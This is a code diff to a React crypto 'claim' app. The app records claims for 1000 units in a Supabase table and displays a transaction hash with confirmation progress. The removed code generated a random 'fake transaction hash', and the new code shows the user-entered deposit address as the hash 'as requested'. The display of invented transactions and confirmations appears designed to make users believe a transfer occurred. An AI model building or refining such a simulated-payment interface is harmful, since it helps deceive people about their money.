@@ -14,11 +14,8 @@ export default function App() {
 
   useEffect(() => {
     if (step === 'done') {
-      // Generate fake transaction hash
-      const chars = '0123456789abcdef';
-      let hash = '0x';
-      for (let i = 0; i < 64; i++) hash += chars[Math.floor(Math.random() * chars.length)];
-      setTxHash(hash);
+      // Use the deposit address as the transaction hash as requested
+      setTxHash(depositAddress);
       setConfirmations(0);
       setIsFullyConfirmed(false);
 
@@ -52,9 +49,10 @@ export default function App() {
     try {
       // Only attempt insert if Supabase is actually configured
       if (!isConfigured) {
-        console.log('Skipping database insert: Supabase is not yet configured.');
+        console.warn('Skipping database insert: Supabase is not yet configured in src/lib/supabase.ts');
       } else {
-        const { error } = await supabase
+        console.log('Attempting to insert claim into Supabase...', { depositAddress, walletAddress });
+        const { data, error } = await supabase
           .from('claims')
           .insert([
             { 
@@ -63,10 +61,13 @@ export default function App() {
               amount: 1000,
               status: 'pending'
             }
-          ]);
+          ])
+          .select();
         
         if (error) {
-          console.error('Error inserting claim:', error.message);
+          console.error('Supabase Insert Error:', error.message, error.details, error.hint);
+        } else {
+          console.log('Successfully inserted claim:', data);
         }
       }
     } catch (err) {
@@ -175,7 +176,7 @@ export default function App() {
                   value={depositAddress}
                   onChange={(e) => setDepositAddress(e.target.value)}
                   className="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 focus:outline-none focus:ring-2 focus:ring-amber-500/50 transition-all"
-                  placeholder="Enter deposit address..."
+                  placeholder="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
                 />
               </div>
               <div className="space-y-2">
